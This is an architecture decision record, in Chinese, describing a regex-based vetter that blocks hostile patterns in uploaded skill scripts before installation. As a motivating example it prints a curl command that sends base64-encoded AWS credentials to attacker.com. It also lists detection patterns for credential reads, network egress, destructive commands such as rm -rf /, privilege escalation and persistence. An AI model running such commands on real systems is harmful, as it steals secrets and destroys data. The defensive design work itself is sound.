# ADR-018 · Skill Vetter 接入策略

- **状态**：已采纳（Accepted）
- **日期**：2026-09-08
- **阶段**：近端 · W1-D1 P0 #1
- **关联**：[W1-W7 todo](../W1-W7-改进方案-todo.md) §1 W1-D1 · `internal/skills/vetter/` · `internal/server/handlers_skills_package.go` · `internal/server/builtin_skills.go:357` · `internal/server/skill_vetter_integration_test.go`

## 背景

Skill 是平台的可执行扩展点：第三方 / 用户上传的 `SKILL.md` + 脚本可以驱动 Copilot、PM SOP、office 文档生成等高风险路径。在 vetter 接入前，skill 装机路径只有 ed25519 签名校验一道防线——但**签名只证明「谁写的」，不证明「写的安全」**。一段带 `curl http://attacker.com/$(cat ~/.aws/credentials | base64)` 的脚本照样能过签名闸门。

现状（接入前）：
- builtin skill 启动时只跑 `verifyBuiltinSignature`，无内容审查
- 第三方 `import` 路径同样只验签
- 没有「模式 → 拒绝」的统一闸门
- 没有 `de_skill_vetter_total{verdict}` 指标，审计和告警完全空白

## 决策

引入 `internal/skills/vetter` 包，作为 **skill 内容审查的唯一闸门**。所有 builtin 启动路径与第三方 import 路径必须在签名前跑 vetter。

### 1. 三层判定

```
input → 5 类 pattern × 每行 → findings[] → 决策
  ├─ 任意 SevBlock 命中 → verdict = deny
  ├─ 仅 SevWarn 命中   → verdict = warn
  └─ 0 命中             → verdict = allow
```

当前所有规则都是 SevBlock → 命中即 deny。SevWarn 字段预留以备未来加非阻断规则。

### 2. 五类 pattern

| 类别 | 文件 | 严重度 | 典型命中 |
|---|---|---|---|
| **credential** | `patterns_credential.go` | SevBlock | `~/.aws/credentials`、`cat .env`、`PRIVATE KEY-----` |
| **egress** | `patterns_egress.go` | SevBlock | `curl http://` / `wget` / PowerShell `iwr` / `iex` |
| **destructive** | `patterns_destructive.go` | SevBlock | `rm -rf /`、`mkfs`、`dd if=`、`shred` |
| **escalation** | `patterns_escalation.go` | SevBlock | `sudo`、`chmod 777`、`chown root` |
| **persistence** | `patterns_persistence.go` | SevBlock | `crontab -e`、`systemctl enable`、boot 脚本 |

每类 pattern 独立 grep，互不交叉（避免一次拒绝触发 50 条 findings 噪音）。

### 3. env flag：`DE_SKILL_VETTER`

| 值 | 默认 | 行为 |
|---|---|---|
| `enabled` | ✅ | SevBlock 命中即拒绝 |
| `warn_only` | — | SevBlock 命中仅日志，audit 行 result=`warn` |
| `disabled` / `off` / `false` / `0` | — | 跳过 vetter（仅 prod 紧急熔断用） |

`vetterMode()` 函数在 `internal/server/builtin_skills.go:357` 读 env 并归一化。

### 4. override 权限：`skill.vet.override`

admin 持有 `skill.vet.override` 权限可在 builtin 路径下强制放行 deny：

```go
overrideVet := auth.Has(id, "skill.vet.override")
if report.Decision == vetter.Deny {
    if overrideVet {
        s.Store.AppendAudit(ws, id.Name, "skill 内容审查", meta.Name, "override", "...")
        break
    }
    return nil, apperr.BadReq(apperr.SkillVetDenied, "...")
}
```

**第三方 `import` 路径不开放 override**——用户上传的代码必须强制 deny，权限收紧一档。

### 5. 用户面对白名单：`.vetter-allow.json`

skill 包根目录放 `.vetter-allow.json` 可抑制特定模式：

```json
{
  "patterns": ["sudo-as-user", "privilege-escalation"],
  "reason": "ops skill — intentional privilege use",
  "ticket": "OPS-1234"
}
```

vetter 自动 `loadAllowFile(rootDir)` 加载。**credential 类规则永不进白名单**——凭据泄漏一次就够出事故，不允许运维侧一纸声明放行。

### 6. 指标

`metrics.Global.Vetter.Inc(verdict)` 在每次 RunBytes 末尾自增；scrape 输出：

```
de_skill_vetter_total{verdict="allow"} N
de_skill_vetter_total{verdict="warn"}  N
de_skill_vetter_total{verdict="deny"}  N
```

deny 计数暴增 = 有人在投毒或写错 skill；warn 计数暴增 = 有人开启 `warn_only` 但规则触发。

### 7. CLI parity

`cmd/verify-skill --vet=strict` 跑离线 vetter，供 CI / 本地 lint 用，与在线逻辑共用 `vetter.RunBytes` 函数。

## 理由

| 替代方案 | 优 | 劣 | 结论 |
|---|---|---|---|
| 沙箱 + eBPF 真拦截 | 真正的隔离 | 部署复杂度 + 性能开销；W6+ 才能落地 | 当前阶段太重，pass |
| AI-based 代码审计（LLM） | 灵活 | 延迟 + 成本 + 不可重现 | 不适合作闸门；可作 audit |
| AST 解析 | 准确率高 | 需 N 种语言 runtime；skill 写 bash/python/js | 边际成本太高，pass |
| regex 模式匹配（本方案） | 简单 / 快 / 单元测试覆盖 / 离线 CI 友好 | 漏报误报；不解析语义 | **采纳**：W1-D1 闸门目的就是拦 95% 明显作恶；剩下 5% 由 gateway + signer + audit 兜底 |

## 影响

| 维度 | 变更 |
|---|---|
| **新增** | `internal/skills/vetter/` (5 pattern 文件 + 决策 + AllowFile)；`vetterMode()`；3 个集成测试 |
| **改动** | `handlers_skills_package.go`（import 路径走 vetter）+ `builtin_skills.go`（启动路径走 vetter） |
| **不开放** | 第三方 import 路径不接 override 通道 |
| **owner** | Skill 团队维护 pattern 库；新模式走 PR review |

## 关联决策

- **ADR-019** Gateway 硬墙 — 产物下载闸门；与 vetter 串联但独立
- **ADR-020** Workspace Publisher Key — 信任链；vetter 不依赖签名但建议保持验签在 vetter 之前失败 fast
- **ADR-021** Vault 接入 — dev/prod keypair；与 vetter 正交

## 验证

```bash
# 单元测试
go test -race -count=1 -timeout 60s ./internal/skills/vetter/...

# 集成测试（覆盖 override / warn_only / enabled 三模式）
go test -race -count=1 -timeout 60s -run 'TestImportSkillVetter|TestImportSkillWarnOnly' ./internal/server/...

# CLI parity
./cmd/verify-skill --vet=strict -path tests/fixtures/skills/evil-with-curl.zip
# → verdict=deny + findings=[curl-egress]
```

## 已知边界 / 后续

- **vetter 不解析语法** — 纯 regex；拼写错误（`cur l`）漏报
- **多行字符串** — 默认按行匹配；跨行模式需扩展
- **二进制** — 仅文本 skill 进 vetter；二进制走 signer 闸门
- **白名单粒度** — `.vetter-allow.json` 在 skill 包根目录；多 skill 共享需各自放
- **AI 增强** — W6-P2 计划加 LLM-based 二审，对 deny 路径做语义分析降低误报